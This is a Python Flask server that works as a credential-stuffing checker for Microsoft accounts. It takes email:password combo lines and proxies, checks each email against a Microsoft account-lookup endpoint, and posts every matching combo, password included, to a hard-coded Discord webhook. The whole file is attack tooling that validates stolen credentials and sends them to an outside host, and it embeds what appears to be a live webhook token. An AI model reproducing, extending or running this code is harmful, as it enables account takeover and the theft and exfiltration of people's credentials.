from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
CORS(app)

WEBHOOK = "https://discord.com/api/webhooks/1472026930038575210/g6Q96LIc7SI4SR1VXsHe_X8sP9gGzFd-3MIfks2ljW2NQT4Pgo196g2PDeYGHzZtxb9v"

def check_logic(email, password, proxy):
    session = requests.Session()
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        # Microsoft HRD kontrolü
        r = session.get(f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}", proxies=proxies, timeout=8)
        if "MSAccount" in r.text:
            return "LIVE" # Detaylı login logic buraya eklenebilir
        return "DIE"
    except:
        return "RETRY"

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    combo = data.get('combo', '')
    proxy = data.get('proxy', '')
    if ':' not in combo: return jsonify({"status": "DIE"})
    
    email, password = combo.split(':', 1)
    res = check_logic(email.strip(), password.strip(), proxy)
    
    if res == "LIVE":
        requests.post(WEBHOOK, json={"content": f"🔥 **Hit:** `{combo}`"})
        
    return jsonify({"status": res})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
